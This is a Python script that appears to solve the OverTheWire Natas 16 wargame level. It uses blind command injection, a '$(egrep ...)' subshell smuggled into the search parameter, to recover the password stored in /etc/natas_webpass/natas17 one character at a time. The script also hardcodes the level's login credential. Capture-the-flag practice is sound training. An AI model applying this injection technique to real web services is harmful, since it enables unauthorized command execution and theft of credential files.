from requests import get
from requests.auth import HTTPBasicAuth

letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
address = 'http://natas16.natas.labs.overthewire.org/index.php?needle=brooked'
auth_data = HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
ending = '&submit=Search'


# grep -i \"$key\" dictionary.txt
def get_result(inj):
    result = get(address + f'$({inj})' + ending, auth=auth_data)
    if "brooked" in result.text:
        # print("FAIL")
        return False
    else:
        # print("SUCCESS")
        return True


# get_result("")
# get_result("echo fail")

# inj: egrep -i ^a /etc/natas_webpass/natas17
seq = ''
for i in range(0, 33):
    for letter in letters:
        inj = f'egrep ^{seq}{letter} /etc/natas_webpass/natas17'
        if get_result(inj):
            seq += letter
            break
    print(seq)
